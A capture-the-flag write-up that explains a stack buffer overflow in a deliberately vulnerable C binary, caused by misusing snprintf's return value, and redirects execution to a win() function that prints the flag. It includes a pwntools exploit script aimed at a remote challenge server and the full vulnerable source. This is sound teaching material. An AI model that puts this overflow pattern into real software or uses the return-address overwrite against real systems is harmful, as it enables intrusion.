# Adventure Chain

### Author

[rudyerudite](https://twitter.com/rudyerudite)

### Description

Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here!

### Solution

Before getting our hands dirty on the binary, we execute a initial `checksec chall` which tells us about the mitigations enabled on the binary.

`Canary                       : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
`

We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point?

Let's have a closer look at what the main is upto (mind that `count`,`buffer1`,`ch` and `pos` are global variables not in the snippet for brevity): 

```C
void main()
{   char buffer[8];
	initialize();
     puts("\nWelcome! A lonely mute program is all I am...");
	puts("\nWould you like to talk to me? (y/n)");
	scanf("%c",&ch[1]);

	while(ch[1]=='y' && count<2)
	{
		puts("Say something...");
		getchar();
		read(0,buffer1,20);
		pos += snprintf(buffer,1,"%s",buffer1);
		puts("\nWould you like to continue talking to me? (y/n)");
		scanf("%c",&ch[1]);
		
		count+=1;
	}

	printf("%d Any bidding words?\n",pos);
	getchar();
	read(0,buffer,pos);
	return;
}
```

Okay, depending on the return value of snprintf we can read `pos` bytes on our buffer. As we earlier saw that the `Canary` is disbaled on stack, thus if `pos` > `sizeof(buffer)` we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the `snprintf` function. 

On a quick lookup by doing `man sprintf` on your terminal, you'll find that `snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available.` --> Does that strike anything?

So well `sprintf` here is writing 1 byte from `buffer1` to `buffer`. If I read 20 bytes into `buffer1` could you think about the return value of the function `snprintf` ? Leaving that as an exercise to the reader.

By using the trick of the return value of `sprintf` (added each time to `pos`), we can increment `pos` to a value such that `pos` > `sizeof(buffer)`. Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program:

```C
void win()
{
    char flag[50]; FILE *ptr;
    ptr = fopen("flag.txt","r");
    if(ptr == NULL)
   {
      printf("Error!");   
      exit(1);             
   }
   fgets(flag,50, (FILE*)ptr);
   printf("%s\n",flag);
   exit(0);
}
```

We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of `main()` to the `win()` function in order to call '`win()` after `main()` function returns. What does that do now? As we can see that calling `win()` would help us read the `flag.txt` file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag!

### Exploit

```python
from pwn import *

#p = process("./chall")
p = remote("34.72.218.129",2222)
p.sendline("y")
p.sendline("a"*19)
p.sendline("y")
p.sendline("b"*19)
p.sendline("n")
#gdb.attach(p)
payload = 'a'*24 + p64(0x400921)
p.sendline(payload)
p.interactive()
```
### Source Code

```C
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

int count=0, pos=0;
char buffer1[20];
char ch[2];
void initialize()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
	alarm(30);
}

void win()
{
    char flag[50]; FILE *ptr;
    ptr = fopen("flag.txt","r");
    if(ptr == NULL)
   {
      printf("Error!");   
      exit(1);             
   }
   fgets(flag,50, (FILE*)ptr);
   printf("%s\n",flag);
   exit(0);
}

void main()
{
	
	
	char buffer[8];
	
	initialize();

	puts("\nWelcome! A lonely mute program is all I am...");
	puts("\nWould you like to talk to me? (y/n)");
	scanf("%c",&ch[1]);

	while(ch[1]=='y' && count<2)
	{
		puts("Say something...");
		getchar();
		read(0,buffer1,20);
		pos += snprintf(buffer,1,"%s",buffer1);
		puts("\nWould you like to continue talking to me? (y/n)");
		scanf("%c",&ch[1]);
		
		count+=1;
	}

	printf("%d Any bidding words?\n",pos);
	getchar();
	read(0,buffer,pos);
	return;
}
```
